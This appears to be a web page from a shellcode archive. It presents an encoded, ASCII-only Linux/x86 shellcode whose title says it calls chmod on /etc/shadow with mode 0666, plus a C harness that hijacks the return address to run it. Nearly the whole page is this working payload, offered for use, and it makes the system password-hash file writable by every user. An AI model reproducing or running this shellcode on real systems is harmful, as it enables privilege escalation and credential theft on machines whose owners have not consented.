<html><head><title>Linux/x86 - chmod(/etc/shadow, 0666) ASCII - 443 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
<meta name="Robots" content="index,follow" /></head><pre>


<pre>
  /*
 | Title: Linux/x86 chmod(/etc/shadow, 0666) ASCII   Shellcode 443 Bytes

 | Type: Shellcode
 | Author: agix
 | Platform: Linux X86
*/

#include &lt;stdio.h&gt;

char shellcode[] =
&quot;LLLLhHEY!X5HEY!&quot;
&quot;HZTYRRRPTURWa-5lmm-2QQQ-8AAAfhRRfZ0p&gt;0x?fh88fZ0p?fh  &quot;
&quot;fZ0pS0pH0p?fh55fZ0p@fhbbfZ0pA0pBfhyyfZ0pAfhwwfZ0pE0pB&quot;
&quot;fhDDfZ0pCfhddfZ0pU0pDfhzzfZ0pW0pDfhuufZ0pEfhhhfZ0pJ0p&quot;
&quot;FfhoofZ0pF0pMfhccfZ0pV0pGfhiifZ0pGfh//fZ0pL0pM0pHfhss&quot;
&quot;fZ0pIfhmmfZ0pIfhaafZ0pJfhHHfZ0pKfhnnfZ0pLfheefZ0pR0pN&quot;
&quot;0pOfhttfZ0pO0pN0xPfhVVfZ0pP0xQfh((fZ0pQfhPPfZ0pQfhfff&quot;
&quot;Z0pRfhFFfZ0pS0xSfhIIfZ0pTfhssfZ0pT0xTfhOOfZ0pV0xVfh22&quot;
&quot;fZ0pXfh  fZ0pX0xXfh@@fZ0pY0xY&quot;

&quot;c'est quoi ma note de secu ?&quot;;


int main(int argc, char **argv) {
        int *ret;
        ret = (int *)&amp;ret + 2;
        (*ret) = (int) shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
